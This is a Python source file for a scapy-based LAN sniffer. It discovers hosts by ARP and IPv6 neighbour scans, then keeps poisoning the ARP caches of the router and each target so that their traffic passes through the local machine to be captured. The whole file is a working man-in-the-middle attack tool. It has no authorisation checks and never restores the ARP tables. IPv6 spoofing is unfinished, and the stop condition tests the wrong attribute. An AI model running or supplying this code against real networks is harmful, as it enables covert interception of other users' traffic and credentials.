import threading
import time

from scapy.arch import get_if_addr, get_if_addr6, get_if_hwaddr
from scapy.base_classes import Net
from scapy.config import conf
from scapy.layers import l2, inet, inet6
from scapy.packet import Packet
from scapy.sendrecv import sendp, sniff, srp1
from scapy.utils6 import Net6

from target import Target


class Sniffer:
    def __init__(self, iff=conf.iface, spoof_interval=2):
        """
        LAN Network sniffer using ARP spoofing
        :param iff: LAN interface
        """
        self.started = False
        self.iff = iff
        self.local_ip = get_if_addr(iff)
        self.local_ip6 = get_if_addr6(iff)
        self.local_mac = get_if_hwaddr(iff)
        self.router_ip = conf.route.route('0.0.0.0')[2]
        self.router_ip6 = conf.route6.route('::')[2]
        self.router_mac = l2.getmacbyip(self.router_ip)
        print("local ip   :", self.local_ip)
        print("local ip6  :", self.local_ip6)
        print("local mac  :", self.local_mac)
        print("router ip  :", self.router_ip)
        print("router ip6 :", self.router_ip6)
        print("router mac :", self.router_mac)
        self.targets = set()
        self.spoof_interval = spoof_interval

    def scan(self, net: str, timeout=0.1):
        """
        Scan LAN, discover sniffable hosts
        :param net: network address in ip cidr
        """
        for ip in Net(net):
            req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / l2.ARP(pdst=ip)
            res = srp1(req, timeout=timeout, verbose=False, iface=self.iff)
            if res is not None and \
                    res[l2.ARP].psrc not in [self.local_ip, self.router_ip] and \
                    res[l2.ARP].hwsrc not in [self.local_mac, self.router_mac]:
                self.targets.add(Target(res[l2.ARP].psrc, res[l2.ARP].hwsrc))

    def scan6(self, net6: str, timeout=0.1):
        """
        Scan LAN, discover sniffable hosts
        :param net6: network address in ipv6 cidr
        """
        for ip6 in Net6(net6):
            req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / inet6.IPv6(dst=ip6) / inet6.ICMPv6ND_NS(tgt=ip6)
            res = srp1(req, timeout=timeout, verbose=False, iface=self.iff)
            if res is not None and \
                    res[inet6.IPv6].src not in [self.local_ip6, self.router_ip6] and \
                    res[l2.Ether].src not in [self.local_mac, self.router_mac]:
                self.targets.add(Target(res[inet6.IPv6].src, res[l2.Ether].src, version=6))

    def add(self, ip: str):
        mac = l2.getmacbyip(ip)
        self.targets.add(Target(ip, mac))

    def add6(self, ip6: str):
        # todo: get mac by ipv6 addr
        pass

    def start(self, on_recv: callable, spoof=True):
        """
        Start sniffing
        :param on_recv: a callback function when receiving a packet
        """
        self.started = True
        print("start sniffing on %d hosts" % len(self.targets))
        if spoof:
            threading.Thread(target=self._spoof_router, daemon=False).start()
            threading.Thread(target=self._spoof_targets, daemon=False).start()
        sniff(lfilter=self._filter, stop_filter=lambda p: not self.start, prn=on_recv, iface=self.iff)

    def _spoof_router(self):
        """
        ARP spoof router
        """
        while self.started:
            for target in self.targets:
                if target.version == 4:
                    p = l2.Ether(dst=self.router_mac) / \
                        l2.ARP(op=2, psrc=target.ip, pdst=self.router_ip, hwsrc=self.local_mac)
                    sendp(p, verbose=False, iface=self.iff)
                elif target.version == 6:
                    # todo: add icmpv6 neighbour spoofing
                    pass
            time.sleep(self.spoof_interval)

    def _spoof_targets(self):
        """
        ARP spoof targets
        """
        while self.started:
            for target in self.targets:
                if target.version == 4:
                    p = l2.Ether(dst=target.mac) / \
                        l2.ARP(op=2, psrc=self.router_ip, pdst=target.ip, hwsrc=self.local_mac)
                    sendp(p, verbose=False, iface=self.iff)
                elif target.version == 6:
                    # todo: add icmpv6 neighbour spoofing
                    pass
            time.sleep(self.spoof_interval)

    def _filter(self, p: Packet):
        """
        Filter packets to make sure we only process on our target's packet
        :param p: packet to be determined
        """
        if p.haslayer(inet.IP):
            return p[inet.IP].src in Target.ip_map or p[inet.IP].dst in Target.ip_map
        elif p.haslayer(inet6.IPv6):
            return p[inet6.IPv6].src in Target.ip6_map or p[inet6.IPv6].dst in Target.ip6_map
